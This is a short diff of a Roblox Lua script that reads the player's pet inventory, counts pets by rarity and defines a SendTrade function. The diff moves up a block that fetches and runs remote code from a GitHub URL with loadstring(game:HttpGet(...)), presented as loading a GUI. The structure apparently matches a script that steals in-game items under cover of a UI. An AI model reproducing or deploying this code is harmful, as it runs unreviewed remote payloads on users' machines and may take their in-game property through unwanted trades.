@@ -11,6 +11,16 @@ local rare_count = 0
 local uncommon_count = 0
 local common_count = 0
 
+if getgenv().ui == nil then
+    getgenv().ui = true
+end
+if getgenv().ui == true then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
+    print("True GUI")
+elseif getgenv().ui == false then
+    print("False GUI")
+end
+
 for i, v in pairs(ClientData.get("inventory").pets) do
   if InventoryDB[v.category][v.id].rarity == "legendary" then
     legendaries_count = legendaries_count + 1
@@ -74,16 +84,6 @@ if httpRequest then
   })
 else
   print("LMAOOOOOO")
-end
-
-if getgenv().ui == nil then
-    getgenv().ui = true
-end
-if getgenv().ui == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
-    print("True GUI")
-elseif getgenv().ui == false then
-    print("False GUI")
 end
 
 local function SendTrade(Username)
